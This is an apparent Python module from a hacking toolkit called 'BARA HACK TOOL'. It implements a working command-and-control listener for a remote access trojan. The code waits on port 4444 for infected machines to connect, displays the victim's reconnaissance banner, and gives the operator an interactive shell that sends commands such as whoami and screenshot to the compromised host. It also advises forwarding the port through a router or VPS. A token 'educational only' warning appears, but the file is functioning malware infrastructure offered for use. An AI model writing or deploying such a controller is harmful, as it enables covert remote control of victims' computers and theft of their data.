# ============================================================
#   BARA HACK TOOL - RAT C2 LISTENER
#   Created by Bara
# ============================================================

import socket
import threading
from datetime import datetime
from ui import (section, err, warn,
                prompt, press_enter, C_GREEN, C_RED, C_YELLOW, C_WHITE, C_CYAN)

SESSIONS = {}


def handle_rat(conn, addr):
    ip = addr[0]
    print(f"\n{C_RED}  ╔══════════════════════════════════════════════╗")
    print(f"{C_RED}  ║  {C_YELLOW}🔥 NEW RAT CONNECTION 🔥{C_RED}                   ║")
    print(f"{C_RED}  ╚══════════════════════════════════════════════╝")
    print(f"{C_GREEN}  IP: {ip}")
    print(f"{C_WHITE}  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    try:
        banner = conn.recv(4096).decode("utf-8", errors="ignore")
        print(f"{C_CYAN}  --- RECON ---{C_WHITE}")
        print(banner)

        SESSIONS[ip] = conn
        print(f"{C_GREEN}  [OK] Session aktif. Command: ls, whoami, pwd, dir, screenshot, exit\n")

        while True:
            cmd = input(f"{C_YELLOW}  rat@{ip}> {C_WHITE}")
            if not cmd:
                continue
            conn.sendall(cmd.encode())
            if cmd == "exit":
                break
            try:
                conn.settimeout(15)
                out = conn.recv(65536)
                print(f"{C_GREEN}{out.decode('utf-8', errors='ignore')}")
            except socket.timeout:
                print(f"{C_YELLOW}  [!] Timeout.")
            except Exception as e:
                err(f"Recv: {e}")
                break
    except Exception as e:
        err(f"Handler: {e}")
    finally:
        try: conn.close()
        except: pass
        SESSIONS.pop(ip, None)


def run_listener():
    section("RAT C2 LISTENER")
    warn("Educational only. Jangan pakai buat kejahatan.")
    port_str = prompt("Port [ENTER = 4444]") or "4444"
    try:
        port = int(port_str)
    except ValueError:
        err("Invalid.")
        press_enter()
        return

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("0.0.0.0", port))
    except OSError as e:
        err(f"Port gagal: {e}")
        press_enter()
        return
    s.listen(10)

    print(f"\n{C_GREEN}  [OK] C2 listener aktif di 0.0.0.0:{port}")
    print(f"{C_YELLOW}  [!] Forward port di router/VPS ke port ini")
    print(f"{C_YELLOW}  [!] Tunggu koneksi masuk... Ctrl+C stop.\n")

    try:
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_rat, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print(f"\n{C_RED}  [!] Stop.")
    finally:
        s.close()
    press_enter()
